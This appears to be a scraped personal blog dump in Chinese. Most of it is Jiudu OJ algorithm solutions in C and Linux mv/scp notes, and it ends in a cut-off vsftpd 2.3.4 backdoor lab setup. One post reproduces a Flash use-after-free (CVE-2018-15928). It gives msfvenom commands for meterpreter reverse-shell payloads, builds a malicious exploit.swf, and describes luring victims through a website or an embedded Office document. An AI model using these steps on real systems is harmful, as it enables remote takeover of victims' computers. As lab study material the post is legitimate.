首先你对借阅记录进行了一番整理，把N个读者依次编号为1,2,…,N，把M本书依次编号为1,2,…,M。同时，按照“臭味相投”的原则，和你喜欢读同一本书的人，就是你的潜在朋友。你现在的任务是从这份借阅记录中计算出每个人有几个潜在朋友。 输入： 每个案例第一行两个整数N,M，2 &lt;&#x3D; N ，M&lt;&#x3D; 200。接下来有N行，第i(i &#x3D; 1,2,…,N)行每一行有一个数，表示读者i-1最喜欢的图书的编号P(1&lt;&#x3D;P&lt;&#x3D;M) 输出： 每个案例包括N行，每行一个数，第i行的数表示读者i有几个潜在朋友。如果i和任何人都没有共同喜欢的书，则输出“BeiJu”（即悲剧，^ ^） 样例输入： 123454 52321 样例输出： 12341BeiJu1BeiJu 代码： 12345678910111213141516171819202122#include &lt;stdio.h&gt;int main()&#123; int students[10001]; int n, m; while(scanf(&quot;%d %d&quot;, &amp;n, &amp;m) != EOF)&#123; int books[201] = &#123;0&#125;; for(int i=0; i&lt;n; i++)&#123; scanf(&quot;%d&quot;, &amp;students[i+1]); books[students[i+1]]++; &#125; for(int i=0; i&lt;n; i++)&#123; int tmp = books[students[i+1]] - 1; if(tmp == 0)&#123; printf(&quot;BeiJu\\n&quot;); &#125;else&#123; printf(&quot;%d\\n&quot;, tmp); &#125; &#125; &#125; return 0;&#125; 九度OJ-剩下的树题目描述： 有一个长度为整数L(1&lt;&#x3D;L&lt;&#x3D;10000)的马路，可以想象成数轴上长度为L的一个线段，起点是坐标原点，在每个整数坐标点有一棵树，即在0,1,2，…，L共L+1个位置上有L+1棵树。 现在要移走一些树，移走的树的区间用一对数字表示，如 100 200表示移走从100到200之间（包括端点）所有的树。 可能有M(1&lt;&#x3D;M&lt;&#x3D;100)个区间，区间之间可能有重叠。现在要求移走所有区间的树之后剩下的树的个数。 输入： 两个整数L(1&lt;&#x3D;L&lt;&#x3D;10000)和M(1&lt;&#x3D;M&lt;&#x3D;100)。 接下来有M组整数，每组有一对数字。 输出： 可能有多组输入数据，对于每组输入数据，输出一个数，表示移走所有区间的树之后剩下的树的个数。 样例输入： 1234500 3100 200150 300470 471 样例输出： 1298 代码： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int trees[10001];int main()&#123; int l, m; while(scanf(&quot;%d %d&quot;, &amp;l, &amp;m) != EOF)&#123; for(int i=0; i&lt;l+1; i++)&#123; trees[i] = 1; &#125; for(int i=0; i&lt;m; i++)&#123; int start, end; scanf(&quot;%d %d&quot;, &amp;start, &amp;end); for(int j=start; j&lt;=end; j++)&#123; trees[j] = 0; &#125; &#125; int trees_num = 0; for(int i=0; i&lt;l+1; i++)&#123; trees_num += trees[i]; &#125; printf(&quot;%d\\n&quot;, trees_num); &#125; return 0;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"排版类问题","slug":"算法/排版类问题","date":"2019-08-18T16:00:00.000Z","updated":"2020-02-02T12:21:06.277Z","comments":true,"path":"2019/08/19/算法/排版类问题/","link":"","permalink":"http://yoursite.com/2019/08/19/%E7%AE%97%E6%B3%95/%E6%8E%92%E7%89%88%E7%B1%BB%E9%97%AE%E9%A2%98/","excerpt":"","text":"排版类问题九度OJ-Repeater题目描述： Harmony is indispensible in our daily life and no one can live without it—-may be Facer is the only exception. One day it is rumored that repeat painting will create harmony and then hundreds of people started their endless drawing. Their paintings were based on a small template and a simple method of duplicating. Though Facer can easily imagine the style of the whole picture, but he cannot find the essential harmony. Now you need to help Facer by showing the picture on computer.You will be given a template containing only one kind of character and spaces, and the template shows how the endless picture is created—-use the characters as basic elements and put them in the right position to form a bigger template, and then repeat and repeat doing that. Here is an example. 12345678910111213141516171819# # # &lt;-template# #So the Level 1 picture will be# # ## #Level 2 picture will be# # # # # ## # # # # # # # # # # # # # # # # # # 输入： The input contains multiple test cases. The first line of each case is an integer N, representing the size of the template is NN (N could only be 3, 4 or 5).Next N lines describe the template.The following line contains an integer Q, which is the Scale Level of the picture.Input is ended with a case of N&#x3D;0.It is guaranteed that the size of one picture will not exceed 30003000. 输出： For each test case, just print the Level Q picture by using the given template. 样例输入： 12345678910111213141516173# # # # #13# # # # #34 OO O OO O OO 20 样例输出： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# # # # ## # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # OO OO O OO O O OO O OO OO OO OO O O O OO O O O OO OO OO OO O O O OO O O O OO OO OO OO O OO O O OO O OO OO 代码： 递归方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;math.h&gt;char buf[3001][3001];char mode[6][6];void paint(int up, int left, int n, int l)&#123; int down = up + pow(n, l); int right = left + pow(n, l); if(l == 1)&#123; int t; for(int i=up; i&lt;down; i++)&#123; for(int j=left; j&lt;right; j++)&#123; buf[i][j] = mode[i-up][j-left]; &#125; &#125; return; &#125;else&#123; for(int i=0; i&lt;n; i++)&#123; for(int j=0; j&lt;n; j++)&#123; if(mode[i][j] != &#x27; &#x27;)&#123; paint(up+i*pow(n, l-1), left+j*pow(n, l-1), n, l-1); &#125; &#125; &#125; &#125;&#125;int main()&#123; //freopen(&quot;repeater.in&quot;, &quot;r&quot;, stdin); int n; int l; while(scanf(&quot;%d&quot;, &amp;n)!=EOF &amp;&amp; n!=0)&#123; for(int i=0; i&lt;n; i++)&#123; for(int j=0; j&lt;n; j++)&#123; scanf(&quot;%c&quot;, &amp;mode[i][j]); while(mode[i][j] == &#x27;\\n&#x27;)&#123; scanf(&quot;%c&quot;, &amp;mode[i][j]); &#125; &#125; &#125; scanf(&quot;%d&quot;, &amp;l); for(int i=0; i&lt;pow(n,l); i++)&#123; for(int j=0; j&lt;pow(n,l); j++)&#123; buf[i][j] = &#x27; &#x27;; &#125; &#125; paint(0, 0, n, l); for(int i=0; i&lt;pow(n, l); i++)&#123; for(int j=0; j&lt;pow(n, l); j++)&#123; printf(&quot;%c&quot;, buf[i][j]); &#125; printf(&quot;\\n&quot;); &#125; &#125; return 0;&#125; 迭代方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;iostream&gt;using namespace std;char module[5][5];char res1[30][30];char res2[30][30];int q;int n;void copy(int x, int y, int flag)&#123; for(int i=0; i&lt;n; i++)&#123; for(int j=0; j&lt;n; j++)&#123; switch(flag)&#123; case 0:&#123; res1[x+i][y+j] = module[i][j]; break; &#125; case 1:&#123; res1[x+i][y+j] = &#x27; &#x27;; break; &#125; case 2:&#123; res2[x+i][y+j] = module[i][j]; break; &#125; case 3:&#123; res2[x+i][y+j] = &#x27; &#x27;; break; &#125; &#125; &#125; &#125;&#125;void nextLevel()&#123; int max = pow(n, q-1); if(q%2 == 1)&#123; for(int i=0; i&lt;max; i++)&#123; for(int j=0; j&lt;max; j++)&#123; if(res2[i][j] != &#x27; &#x27;)&#123; copy(i*n, j*n, 0); &#125;else&#123; copy(i*n, j*n, 1); &#125; &#125; &#125; &#125;else&#123; for(int i=0; i&lt;max; i++)&#123; for(int j=0; j&lt;max; j++)&#123; if(res1[i][j] != &#x27; &#x27;)&#123; copy(i*n, j*n, 2); &#125;else&#123; copy(i*n, j*n, 3); &#125; &#125; &#125; &#125;&#125;int main(int argc, char *argv[])&#123; int l; char filename[20]; sprintf(filename, &quot;%s%s%s&quot;, &quot;repeater&quot;, argv[1], &quot;.in&quot;); freopen(filename, &quot;r&quot;, stdin); while(scanf(&quot;%d&quot;, &amp;n)!=EOF &amp;&amp; n!=0)&#123; cin.get(); for(int i=0; i&lt;n; i++)&#123; cin.getline(module[i], n+1); &#125; cin &gt;&gt; l; copy(0, 0, 0); for(q=2; q &lt;= l; q++)&#123; nextLevel(); &#125; int max = pow(n, l); if(l%2==1)&#123; for(int i=0; i&lt;max; i++)&#123; for(int j=0; j&lt;max; j++)&#123; cout&lt;&lt;res1[i][j]; &#125; cout&lt;&lt;endl; &#125; &#125;else&#123; for(int i=0; i&lt;max; i++)&#123; for(int j=0; j&lt;max; j++)&#123; if(res2[i][j] == &#x27;\\0&#x27;)&#123; cout&lt;&lt;&#x27; &#x27;; &#125;else&#123; cout&lt;&lt;res2[i][j]; &#125; &#125; cout&lt;&lt;endl; &#125; &#125; &#125; return 0;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"日期类问题","slug":"算法/日期类问题","date":"2019-08-18T16:00:00.000Z","updated":"2020-02-02T12:23:05.631Z","comments":true,"path":"2019/08/19/算法/日期类问题/","link":"","permalink":"http://yoursite.com/2019/08/19/%E7%AE%97%E6%B3%95/%E6%97%A5%E6%9C%9F%E7%B1%BB%E9%97%AE%E9%A2%98/","excerpt":"","text":"日期类问题九度OJ-今年的第几天？题目描述： 输入年、月、日，计算该天是本年的第几天。 输入描述： 包括三个整数年(1&lt;&#x3D;Y&lt;&#x3D;3000)、月(1&lt;&#x3D;M&lt;&#x3D;12)、日(1&lt;&#x3D;D&lt;&#x3D;31)。 输出描述： 输入可能有多组测试数据，对于每一组测试数据，输出一个整数，代表Input中的年、月、日对应本年的第几天。 示例： 1234567输入1990 9 202000 5 1输出263122 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;stdio.h&gt;#define ISYEAP(x) x%100!=0 &amp;&amp; x%4==0 || x%400==0?1:0int dayOfMonth[13][2] = &#123; 0, 0, 31, 31, 28, 29, 31, 31, 30, 30, 31, 31, 30, 30, 31, 31, 31, 31, 30, 30, 31, 31, 30, 30, 31, 31&#125;;struct Date&#123; int year; int month; int day; void nextDay()&#123; day++; if(day&gt;dayOfMonth[month][ISYEAP(year)])&#123; month++; day = 1; if(month &gt; 12)&#123; year++; month = 1; &#125; &#125; &#125;&#125;;int buf[5001][13][32];int main()&#123; int cnt = 0; Date tmp; tmp.year = 0; tmp.month = 1; tmp.day = 1; while(tmp.year != 5001)&#123; buf[tmp.year][tmp.month][tmp.day] = cnt; tmp.nextDay(); cnt++; &#125; int y, m, d; while(scanf(&quot;%d %d %d&quot;, &amp;y, &amp;m, &amp;d) != EOF)&#123; printf(&quot;%d\\n&quot;, buf[y][m][d] - buf[y][1][1] + 1); &#125; return 0;&#125; 打印日期题目描述： 给出年分m和一年中的第n天，算出第n天是几月几号。 输入： 输入包括两个整数y(1&lt;&#x3D;y&lt;&#x3D;3000)，n(1&lt;&#x3D;n&lt;&#x3D;366)。 输出： 可能有多组测试数据，对于每组数据，按 yyyy-mm-dd的格式将输入中对应的日期打印出来。 样例输入： 1234562000 32000 312000 402000 602000 612001 60 样例输出： 1234562000-01-032000-01-312000-02-092000-02-292000-03-012001-03-01 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;stdio.h&gt;#define ISYEAP(x) x%100!=0 &amp;&amp; x%4==0 || x%400==0 ? 1 : 0int dayOfMonth[13][2] = &#123; 0, 0, 31, 31, 28, 29, 31, 31, 30, 30, 31, 31, 30, 30, 31, 31, 31, 31, 30, 30, 31, 31, 30, 30, 31, 31&#125;;struct Date&#123; int year; int month; int day; void nextDay()&#123; day++; if(day &gt; dayOfMonth[month][ISYEAP(year)])&#123; day = 1; month++; if(month &gt; 12)&#123; month = 1; year++; &#125; &#125; &#125;&#125;;int main()&#123; int cnt; int n; Date tmp; while(scanf(&quot;%d %d&quot;, &amp;tmp.year, &amp;n) != EOF)&#123; tmp.month = 1; tmp.day = 1; cnt = 1; while(cnt != n)&#123; tmp.nextDay(); cnt++; &#125; printf(&quot;%d-%02d-%02d\\n&quot;, tmp.year, tmp.month, tmp.day); &#125; return 0;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"排序问题","slug":"算法/排序问题","date":"2019-08-18T16:00:00.000Z","updated":"2020-02-02T12:21:22.625Z","comments":true,"path":"2019/08/19/算法/排序问题/","link":"","permalink":"http://yoursite.com/2019/08/19/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E9%97%AE%E9%A2%98/","excerpt":"","text":"排序问题九度OJ-特殊排序题目描述：输入一系列整数，将其中最大的数挑出，并将剩下的数进行排序。 输入：输入第一行包括1个整数N，1&lt;&#x3D;N&lt;&#x3D;1000，代表输入数据的个数。接下来的一行有N个整数。 输出：可能有多组测试数据，对于每组数据，第一行输出一个整数，代表N个整数中的最大值，并将此值从数组中去除，将剩下的数进行排序。第二行将排序的结果输出。 样例输入：41 3 4 2 样例输出：41 2 3 提示：如果数组中只有一个数，当第一行将其输出后，第二行请输出”-1”。 代码： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; int n; int max = 0; int buf[1000]; while(scanf(&quot;%d&quot;, &amp;n)!=EOF)&#123; for(int i=0; i&lt;n; i++)&#123; scanf(&quot;%d&quot;, &amp;buf[i]); &#125; if(n==1)&#123; printf(&quot;%d\\n&quot;, buf[0]); printf(&quot;-1\\n&quot;); &#125;else&#123; sort(buf, buf+n); printf(&quot;%d\\n&quot;, buf[n-1]); for(int i=0;i&lt;n-1;i++)&#123; printf(&quot;%d &quot;, buf[i]); &#125; printf(&quot;\\n&quot;); &#125; &#125; return 0;&#125; 九度OJ-EXCEL排序题目描述： Excel可以对一组纪录按任意指定列排序。现请你编写程序实现类似功能。 对每个测试用例，首先输出1行“Case i:”，其中 i 是测试用例的编号（从1开始）。随后在 N 行中输出按要求排序后的结果，即：当 C&#x3D;1 时，按学号递增排序；当 C&#x3D;2时，按姓名的非递减字典序排序；当 C&#x3D;3时，按成绩的非递减排序。当若干学生具有相同姓名或者相同成绩时，则按他们的学号递增排序。 输入： 测试输入包含若干测试用例。每个测试用例的第1行包含两个整数 N (N&lt;&#x3D;100000) 和 C，其中 N 是纪录的条数，C 是指定排序的列号。以下有N行，每行包含一条学生纪录。每条学生纪录由学号（6位数字，同组测试中没有重复的学号）、姓名（不超过8位且不包含空格的字符串）、成绩（闭区间[0, 100]内的整数）组成，每个项目间用1个空格隔开。当读到 N&#x3D;0 时，全部输入结束，相应的结果不要输出。 输出： 对每个测试用例，首先输出1行“Case i:”，其中 i 是测试用例的编号（从1开始）。随后在 N 行中输出按要求排序后的结果，即：当 C&#x3D;1 时，按学号递增排序；当 C&#x3D;2时，按姓名的非递减字典序排序；当 C&#x3D;3时，按成绩的非递减排序。当若干学生具有相同姓名或者相同成绩时，则按他们的学号递增排序。 样例输入： 1234567891011121314153 1000007 James 85000010 Amy 90000001 Zoe 604 2000007 James000010 Amy 90000001 Zoe 60000002 James 984 3000007 James 85000010 Amy 90000001 Zoe 60000002 James 900 0 样例输出： 1234567891011121314Case 1:000001 Zoe 60000007 James 85000010 Amy 90Case 2:000010 Amy 90000002 James 98000007 James 85000001 Zoe 60Case 3:000001 Zoe 60000007 James 85000002 James 90000010 Amy 90 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;algorithm&gt;#include &lt;string.h&gt;using namespace std;struct Student&#123; int num; char name[9]; int score;&#125;students[100000];int c;int case_num=1;int cmp(Student a, Student b)&#123; if(c == 1)&#123; return a.num &lt; b.num; &#125; if(c == 2)&#123; return strcmp(a.name, b.name); &#125; if(c == 3)&#123; return a.score &lt; b.score; &#125;&#125;int main()&#123; int n; scanf(&quot;%d&quot;, &amp;n); while(1)&#123; if(n == 0)&#123; return 0; &#125; scanf(&quot;%d&quot;, &amp;c); for(int i=0; i&lt;n; i++)&#123; scanf(&quot;%d&quot;, &amp;students[i].num); scanf(&quot;%s&quot;, students[i].name); scanf(&quot;%d&quot;, &amp;students[i].score); &#125; sort(students, students+n, cmp); printf(&quot;Case %d\\n&quot;, case_num); case_num++; for(int i=0; i&lt;n; i++)&#123; printf(&quot;%06d %s %d\\n&quot;, students[i].num, students[i].name, students[i].score); &#125; scanf(&quot;%d\\n&quot;, &amp;n); &#125; return 0;&#125;&#125; 九度OJ-字符串内排序题目描述： 输入一个字符串，长度小于等于200，然后将输出按字符顺序升序排序后的字符串。 输入： 测试数据有多组，输入字符串。 输出： 对于每组输入,输出处理后的结果。 样例： 1234输入：bacd输出：abcd 代码： 12345678910111213#include &lt;stdio.h&gt;#include &lt;algorithm&gt;#include &lt;string.h&gt;using namespace std;int main()&#123; char str[201]; while(scanf(&quot;%s&quot;, str) != EOF)&#123; sort(str, str+strlen(str)); printf(&quot;%s\\n&quot;, str); &#125; return 0;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"查找类问题","slug":"算法/查找类问题","date":"2019-08-18T16:00:00.000Z","updated":"2020-02-02T12:20:10.122Z","comments":true,"path":"2019/08/19/算法/查找类问题/","link":"","permalink":"http://yoursite.com/2019/08/19/%E7%AE%97%E6%B3%95/%E6%9F%A5%E6%89%BE%E7%B1%BB%E9%97%AE%E9%A2%98/","excerpt":"","text":"查找类问题什么是查找类问题？查找问题具有三个要素： 查找空间，也常被成为解空间，是我们搜索的范围。 查找目标。用于判断查找活动是否成功。 查找方法。 所谓查找，就是在查找空间内，利用一定的查找方法找到查找目标的过程。例如：查找某个数字在数组中的下标。 查找分类：根据查找范围 在一堆元素中查找 在一张图中查找 根据查找目标 一定能够找到目标 不一定能够找到目标 典型查找方法遍历查找时间复杂度：O(n) 二分查找前提条件：查找空间中的元素应该是有序的。 时间复杂度：O(logn) 广度优先搜索深度优先搜索递归搜索问题 查找和搜索的区别是什么？ 九度OJ-打印极值点下标题目描述： 在一个整数数组上，对于下标为i的整数，如果它大于所有它相邻的整数，或者小于所有它相邻的整数，则称为该整数为一个极值点，极值点的下标就是i。 输入： 每个案例的输入如下： 有2×n+1行输入：第一行是要处理的数组的个数n；对其余2×n行，第一行是此数组的元素个数k(4&lt;k&lt;80)，第二行是k个整数，每两个整数之间用空格分隔。 输出： 每个案例输出为n行：每行对应于相应数组的所有极值点下标值，下标值之间用空格分隔。 样例输入： 123456731010 12 12 11 11 12 23 24 12 121512 12 122 112 222 211 222 221 76 36 31 234 256 76 76 1512 14 122 112 222 222 222 221 76 36 31 234 256 76 73 样例输出： 1230 72 3 4 5 6 10 120 2 3 10 12 14 代码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;int buf[80];int main()&#123; freopen(&quot;extreme_point.in&quot;, &quot;r&quot;, stdin); int n; while(scanf(&quot;%d&quot;, &amp;n) != EOF)&#123; for(int i=0; i&lt;n; i++)&#123; int k; scanf(&quot;%d&quot;, &amp;k); for(int j=0; j&lt;k; j++)&#123; scanf(&quot;%d&quot;, &amp;buf[j]); &#125; for(int j=0; j&lt;k; j++)&#123; if(j == 0)&#123; if(buf[j] != buf[j+1]) printf(&quot;%d &quot;, j); &#125;else if(j == k-1)&#123; if(buf[j] != buf[j-1]) printf(&quot;%d &quot;, j); &#125;else&#123; if(buf[j]&lt;buf[j-1]&amp;&amp;buf[j]&lt;buf[j+1] || buf[j]&gt;buf[j-1]&amp;&amp;buf[j]&gt;buf[j+1]) printf(&quot;%d &quot;, j); &#125; &#125; printf(&quot;\\n&quot;); &#125; &#125; return 0;&#125; 九度OJ-查找题目描述： 输入数组长度 n输入数组 a[1…n]输入查找个数m输入查找数字b[1…m]输出 YES or NO 查找有则YES 否则NO 。 输入： 输入有多组数据。每组输入n，然后输入n个整数，再输入m，然后再输入m个整数（1&lt;&#x3D;m&lt;&#x3D;n&lt;&#x3D;100）。 输出： 如果在n个数组中输出YES否则输出NO。 样例输入： 1234567851 5 2 4 332 5 61234 样例输出： 123YESYESNO 代码： 线性查找 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;int buf[100];int main()&#123; int n; while(scanf(&quot;%d&quot;, &amp;n) !=EOF)&#123; for(int i=0; i&lt;n; i++)&#123; scanf(&quot;%d&quot;, &amp;buf[i]); &#125; int m; scanf(&quot;%d&quot;, &amp;m); for(int i=0; i&lt;m; i++)&#123; int target; int ans = -1; scanf(&quot;%d&quot;, &amp;target); for(int j=0; j&lt;n; j++)&#123; if(target == buf[j])&#123; ans = j; break; &#125; &#125; if(ans == -1) printf(&quot;NO\\n&quot;); else printf(&quot;YES\\n&quot;); &#125; &#125; return 0;&#125; 二分查找 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;algorithm&gt;using namespace std;int buf[100];int main()&#123; int n; while(scanf(&quot;%d&quot;, &amp;n) !=EOF)&#123; for(int i=0; i&lt;n; i++)&#123; scanf(&quot;%d&quot;, &amp;buf[i]); &#125; sort(buf, buf+n); int m; scanf(&quot;%d&quot;, &amp;m); for(int i=0; i&lt;m; i++)&#123; int target; int ans = -1; scanf(&quot;%d&quot;, &amp;target); int base = 0, top = n-1; while(base &lt;= top)&#123; int mid = (base + top) / 2; if(buf[mid] == target)&#123; ans = mid; break; &#125;else if(buf[mid] &gt; target)&#123; top = mid - 1; &#125;else&#123; base = mid +1; &#125; &#125; if(ans == -1) printf(&quot;NO\\n&quot;); else printf(&quot;YES\\n&quot;); &#125; &#125; return 0;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"CVE-2018-15928 漏洞复现","slug":"漏洞复现/CVE-2018-15928-漏洞复现","date":"2019-08-06T13:58:51.000Z","updated":"2020-02-02T13:03:57.784Z","comments":true,"path":"2019/08/06/漏洞复现/CVE-2018-15928-漏洞复现/","link":"","permalink":"http://yoursite.com/2019/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2018-15928-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"漏洞描述Adobe Flash Player的版本： Adobe Flash Player &lt;&#x3D; 31.0.0.153 Adobe Flash Player Installer&lt;&#x3D; 31.0.0.108 中存在UAF漏洞，该漏洞允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。 漏洞复现 复现环境：靶机：Windows 7 SP1 32位 攻击机：Kali-LInux 2019 01 生成恶意样本 生成meterpreter反弹payload 12msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f raw &gt; 86.bin msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f raw &gt; 64.bin 使用payload生成exploit文件 https://github.com/Ridter/CVE-2018-15982_EXP 12python CVE_2018_15982.py -i 86.bin -I 64.bin# output: exploit.swf（恶意样本文件）, index.html（实际没什么用） 生成了恶意样本之后，如何让受害者访问到恶意样本呢？我们采取了两种方式：第一种是将恶意样本放到网站上；第二种是将恶意样本嵌入到文档中。 02 将恶意样本放到网站上将exploit.swf文件放到网站下，诱导用户访问网站，如果用户调用了包含漏洞的Adobe Flash Player来打开该文件，就会受到攻击。 03 将恶意样本嵌入文档中将exploit.swf文件嵌入到文档中，诱导用户打开并加载。Word&#x2F; Excel &#x2F; PowerPoint -&gt; 开发工具 -&gt; 添加其他控件 -&gt; Shockwave Flash Object -&gt; 设计模式 -&gt; 属性 -&gt; movie","raw":null,"content":null,"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[]},{"title":"mv命令","slug":"Linux/mv命令","date":"2019-07-07T14:22:33.000Z","updated":"2020-02-02T12:29:47.317Z","comments":true,"path":"2019/07/07/Linux/mv命令/","link":"","permalink":"http://yoursite.com/2019/07/07/Linux/mv%E5%91%BD%E4%BB%A4/","excerpt":"","text":"mv命令用于为移动文件&#x2F;目录和重命名文件&#x2F;目录 定义：将路径分为path和filename（包含目录）两部分，包含path和filename的写法称为完整路径，而省略了filename的写法称为不完整路径，即：完整路径：path/filename不完整路径：path 在介绍这个命令的两种用法之前，首先强调三点理解： 目录本质上是特殊的文件，所以大部分时候处理方法和文件一致，无需特别区分。 移动文件&#x2F;目录和重命名文件&#x2F;目录本质上都是改变文件的路径，无需特别区分。 处理优先级：首先尽量认为target是完整路径，先尽量无冲突修改路径，然后考虑覆盖；上面两种情况都不可行的情况下认为target是不完整路径，构造新的完整路径，同样先尽量无冲突修改路径，然后考虑覆盖；如果上面的情况都不行，只能修改失败退出。 基本用法：1Usage: mv source target 工作原理： 检查源路径是否存在，不存在报错并退出； 首先认为目标路径是完整路径，首先检查path部分，如果该完整路径的path部分不存在，报错并退出； 然后检查filename部分，如果不存在，直接修改路径，命令执行成功，如果存在，继续判断； 完整路径path/filename是文件，如果源路径是文件，则覆盖，如果是文件夹，则报错并退出。 完整路径path/filename是目录，认为目标路径是不完整路径，即将原来的路径看作新的path，将源文件&#x2F;目录名看作是filename，重新拼接成完整路径path/filename。新的完整路径如果不存在冲突，直接修改路径，命令执行成功；如果存在冲突，尝试覆盖，目录不能覆盖文件，文件不能覆盖目录，目录不能覆盖非空目录，文件可以覆盖文件。 进阶用法： 批量移动文件 正则表达式匹配 1mv test* ../test 选项 是否可能导致文件丢失？ 如何区分移动文件和重命名 如何区分移动文件和目录 如何区分是否递归移动目录 可能默认就是递归的，不是递归的情况感觉怪怪的 如果移动的文件正在读写，会出现什么情况。 如果命令出错后果是什么，会导致文件丢失吗？ 文件名重复、路径不存在、mv命令是如何实现的呢 想象自己就是计算机，需要判断上面的这些问题，我需要哪些信息呢？","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux命令","slug":"Linux命令","permalink":"http://yoursite.com/tags/Linux%E5%91%BD%E4%BB%A4/"}]},{"title":"使用scp在Windows和Linux之间传输文件/目录","slug":"Linux/使用scp在Windows和Linux之间传输文件-目录","date":"2019-07-06T11:52:48.000Z","updated":"2020-02-02T12:29:10.002Z","comments":true,"path":"2019/07/06/Linux/使用scp在Windows和Linux之间传输文件-目录/","link":"","permalink":"http://yoursite.com/2019/07/06/Linux/%E4%BD%BF%E7%94%A8scp%E5%9C%A8Windows%E5%92%8CLinux%E4%B9%8B%E9%97%B4%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95/","excerpt":"","text":"有时候需要在Windows和Linux系统之间传递文件&#x2F;目录，如果只是偶尔使用这个功能，专门下载软件太麻烦了，这时候可以用scp命令实现我们的需求。 scp是secure copy的缩写，是Linux系统下基于ssh登录进行的安全文件&#x2F;目录拷贝命令。 12Usage: scp [-r] [[user@]host:]source [[user@]host:]target// 还有一些其他的选项，不一一列出 有几个注意事项： 在传输目录的时候，一定要加上参数-r 否则无法传输成功。 客户端可以省略username，hostname，previous working directory，只需要填写相对路径就可以了。 当Windows作为ssh server的时候，有几个注意事项： Windows10 默认并没有安装ssh服务，通过 “设置 -&gt; 应用 -&gt; 应用和功能 -&gt; 可选功能 -&gt; 添加功能 -&gt; openssh服务端” 来安装ssh服务，然后通过命令net start sshd启动服务，通过命令net stop sshd停止服务。 Windows账号的username可以通过在Cmd或者PowerShell中使用whoami命令查看，密码为Microsoft账号的密码。 Windows的路径写法/c:/path 具体来说，可以分为四种情况: Linux为ssh client，Windows为ssh server： 从Linux上拷贝文件到Windows上 从Windows上拷贝文件到Linux上 Windows为ssh client，Linux为ssh server： 从Linux上拷贝文件到Windows上 从Windows上拷贝文件到Linux上","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux命令","slug":"Linux命令","permalink":"http://yoursite.com/tags/Linux%E5%91%BD%E4%BB%A4/"}]},{"title":"vsftpd-2.3.4笑脸漏洞&docker漏洞复现","slug":"漏洞复现/搭建vsftpd-2.3.4笑脸漏洞环境过程","date":"2019-03-20T16:00:00.000Z","updated":"2020-02-02T12:49:24.230Z","comments":true,"path":"2019/03/21/漏洞复现/搭建vsftpd-2.3.4笑脸漏洞环境过程/","link":"","permalink":"http://yoursite.com/2019/03/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%90%AD%E5%BB%BAvsftpd-2.3.4%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E8%BF%87%E7%A8%8B/","excerpt":"","text":"0x01 在ubuntu镜像上使用源码配置vsftpd-2.3.4 源码配置较为麻烦，但是镜像的选用上要自由很多。 安装依赖环境和相关工具。 在使用Dockerfile构建镜像的时候，经常出现fetch error，后来发现是源的问题，使用命令sed -i s@/archive.ubuntu.com/@/mirrors.163.com/@g /etc/apt/sources.list换成163的源之后下载速度快了很多，也不会出现fetch error的问题了。 12345RUN sed -i s@/archive.ubuntu.com/@/mirrors.163.com/@g /etc/apt/sources.list \\ &amp;&amp; apt-get clean \\ &amp;&amp; apt-get update --fix-missing \\ &amp;&amp; apt-get upgrade -y \\ &amp;&amp; apt-get install -y wget vim make gcc git autoconf automake byacc flex --fix-missing 创建用户和目录。 这一步是看着教程做的，具体是为了什么我不清楚。 下载vsftpd-2.3.4源码并安装 12345678910111213141516# vsftpd-2.3.4的源码有两个版本：有后门和没有后门的，[trace down the backdoor in vsFTPd 